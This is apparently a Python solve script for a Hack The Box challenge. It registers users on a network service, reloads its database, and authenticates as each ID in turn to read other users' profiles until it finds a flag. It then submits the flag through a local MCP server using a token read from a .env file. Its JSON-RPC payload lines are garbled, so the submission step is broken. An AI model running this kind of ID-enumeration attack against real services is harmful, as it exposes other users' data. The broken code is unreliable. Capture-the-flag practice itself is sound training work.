import os, re, socket, time, subprocess, sys

def recv_all(sock, timeout=0.5):
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
            if len(data) < 4096:
                break
    except Exception:
        pass
    return b"".join(chunks)

def send_cmd(sock, cmd, delay=0.2):
    if not cmd.endswith("\n"):
        cmd += "\n"
    sock.sendall(cmd.encode())
    time.sleep(delay)
    return recv_all(sock, 0.8)

def extract_flag(text):
    m = re.search(r"HTB\{[^}\n]+\}", text)
    return m.group(0) if m else None

def submit_flag(flag):
    env_path = "/workspace/mcp/HTB-MCP-FUNCIONANDO/.env"
    token=None
    with open(env_path) as f:
        for line in f:
            if line.startswith("HTB_TOKEN="):
                token=line.strip().split("=",1)[1]
                break
    assert token, "No token in .env"
    payload1 = jsonrpc:2.0n
    payload2 = jsonrpc:2.0n
    p = subprocess.Popen(["/workspace/mcp/HTB-MCP-FUNCIONANDO/htb-mcp-server"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, env={"HTB_TOKEN": token}, text=True)
    p.stdin.write(payload1)
    p.stdin.flush()
    p.stdout.readline()
    p.stdin.write(payload2)
    p.stdin.flush()
    res = p.stdout.readline()
    p.terminate()
    return res

def main():
    ip=os.environ.get("IP"); port=int(os.environ.get("PORT"))
    with socket.create_connection((ip, port), timeout=5) as s:
        _ = recv_all(s, 0.3)
        # Register up to 10 keys
        assigned_ids=[]
        for i in range(1,11):
            resp = send_cmd(s, f"REKE u{i}:p{i}")
            m = re.search(rb"Registered: ID->(\d+)", resp)
            if m:
                assigned_ids.append(int(m.group(1)))
            else:
                # Stop if full
                break
        # Save all newly assigned
        for rid in assigned_ids:
            send_cmd(s, f"SAVE {rid}")
        # Reload and search profiles
        send_cmd(s, "RLDB")
        for auth_id in range(1,11):
            send_cmd(s, f"AUTH {auth_id}")
            page = send_cmd(s, "GTPR").decode(errors="ignore")
            flag = extract_flag(page)
            if flag:
                print(flag)
                res = submit_flag(flag)
                print(res)
                return
        print("NO_FLAG")

if __name__ == "__main__":
    main()
